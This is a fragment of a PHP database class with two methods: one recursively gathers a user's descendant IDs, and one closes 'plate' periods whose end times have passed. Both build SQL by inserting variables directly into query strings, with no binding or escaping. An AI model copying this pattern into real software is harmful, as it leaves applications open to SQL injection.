        function get_user_children_ids($user_id,$ids=array()){
            if(empty($ids)){
                $ids[]=$user_id;
            }
            $sql="select user_id from users where top_id=$user_id";
            $x=  $this->query($sql);
            while ($row = $this->fetch_array($x)) {
                $ids[]=$row['user_id'];
                $ids=$this->get_user_children_ids($row['user_id'], $ids);
            }
            return $ids;
        }
        
        function close_plate(){
            $query = $this->select('plate', '*', '1 order by plate_num desc ');
            $row = $this->fetch_array($query);
            if($row['is_plate_start']==1){
                return 1;
            }else{
                if($row['plate_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_plate_start=1 where plate_num=".$row['plate_num']);
                }
                if($row['special_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_special=1 where plate_num=".$row['plate_num']);
                }
                if($row['normal_time_end'] < date("Y-m-d H:i:s")){
                    $this->query("update plate set is_normal=1 where plate_num=".$row['plate_num']);
                }
            }
        }
} 
?>